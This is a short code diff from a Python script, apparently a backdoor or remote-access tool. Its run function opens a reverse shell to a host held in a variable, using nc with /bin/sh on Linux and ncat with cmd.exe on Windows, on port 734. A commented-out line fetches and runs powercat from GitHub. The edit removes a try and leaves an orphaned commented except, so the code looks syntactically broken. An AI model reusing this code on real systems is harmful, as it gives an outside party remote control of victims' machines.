@@ -70,9 +70,8 @@ def run(token):
         #os.system( 'nc -lvp 734 -e /bin/sh')
         os.system('nc' + iph+ ' 734 -e /bin/sh')
     elif "Windows" in platform.system():
-        try:
 	   #os.system('ncat -lvp 734 -e cmd.exe')
-            os.system('ncat '+ iph +' 734 -e cmd.exe')
+          os.system('ncat '+ iph +' 734 -e cmd.exe')
 	
 	#except:
 	   #os.system('iex(iwr https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 -UseBasicParsing)')
